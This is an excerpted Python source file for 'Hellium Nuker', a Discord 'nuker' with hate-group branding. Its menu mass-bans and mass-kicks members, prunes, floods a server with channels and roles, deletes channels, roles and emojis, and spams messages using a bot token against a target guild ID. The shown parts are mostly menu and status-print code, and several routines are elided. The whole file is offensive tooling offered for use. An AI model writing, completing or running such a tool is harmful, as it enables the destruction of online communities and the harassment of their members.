...
\____/|_|      |_/\_| \_/\___|_| |_|\_____/
                               ...
                               *HATE RUNS CORD Hate on top!! Br4KenZ ON TOP!!*
                              ═══════════════════════════════════         
                         ═════════════════════════════════════════════
...
class Hellium:
    ...
    def menu(self):
        os.system(f"cls & title Hellium Nuker ^| Authenticated as: {__client__.user.name}#{__client__.user.discriminator}")
        print(Hellium_art + options + "\n")
        ans = input("{}({}Hellium{}) Option{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m")) 
        
        if ans in ["1", "01"]:
            scrape = input("{}({}Hellium{}) Fetch IDs [Y/N]{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
            if scrape.lower() == "y":
                try:
            ...
            time.sleep(3)
            print("{}({}Hellium{}) Banned {}/{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", len(self.banned), len(members)))
            time.sleep(1.5)
            self.menu()
            ...
            time.sleep(3)
            print("{}({}Hellium{}) Kicked {}/{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", len(self.kicked), len(members)))
            time.sleep(1.5)
            self.menu()
            
        elif ans in ["3", "03"]:
            days = int(input("{}({}Hellium{}) Days{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m")))
            self.execute_prune(guildid, days, token)
            time.sleep(1.5)
            self.menu()
            
        elif ans in ["4", "04"]:
            type = input("{}({}Hellium{}) Channels Type ['t', 'v']{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
            ...
            time.sleep(3)
            print("{}({}Hellium{}) Created {}/{} channels".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", len(self.channels), amount))
            time.sleep(1.5)
            self.menu()
            ...
            time.sleep(3)
            print("{}({}Hellium{}) Created {}/{} roles".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", len(self.roles), amount))
            time.sleep(1.5)
            self.menu()
            ...
            time.sleep(3)
            print("{}({}Hellium{}) Deleted {}/{} channels".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", len(self.channels), len(channels)))
            time.sleep(1.5)
            self.menu()
            ...
            time.sleep(3)
            print("{}({}Hellium{}) Deleted {}/{} roles".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", len(self.roles), len(roles)))
            time.sleep(1.5)
            self.menu()
            ...
            time.sleep(3)
            print("{}({}Hellium{}) Deleted {}/{} emojis".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", len(self.emojis), len(emojis)))
            time.sleep(1.5)
            self.menu()
            ...
            time.sleep(3)
            print("{}({}Hellium{}) Spammed {}/{} messages".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", len(self.messages), amount))
            time.sleep(1.5)
            self.menu()
            ...
            try:
                ...
                if VERSION != check_version:
                    print("{}({}Hellium{}) You're using an outdated version!".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
                    webbrowser.open(f"")
                else:
                    print("{}({}Hellium{}) You're using the current version!".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
            except:
                print("{}({}Hellium{}) Couldn't reach the releases!".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
            ...
            print("- Hellium Nuker is a open sourced nuker which has been developed with heart by .darks.4sure. My goal was to make a great 2022's working nuker and to compete with actuals viral discord nukers")
            input("")
            self.menu()
        
        elif ans == "12":
            print("{}({}Hellium{}) Thanks for using Hellium!".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
            time.sleep(1.5)
            os._exit(0)
...
@__client__.event
async def on_ready():
    print("{}({}Hellium{}) Authenticated as{}: {}{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", f"{__client__.user.name}#{__client__.user.discriminator}"))
    time.sleep(1.5)
    Hellium().menu()
...
if __name__ == "__main__":
    try:
        os.system("title Hellium Nuker ^| Authentication & mode con: cols=95 lines=25")
        guildid = input("{}({}Hellium{}) Guild ID{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
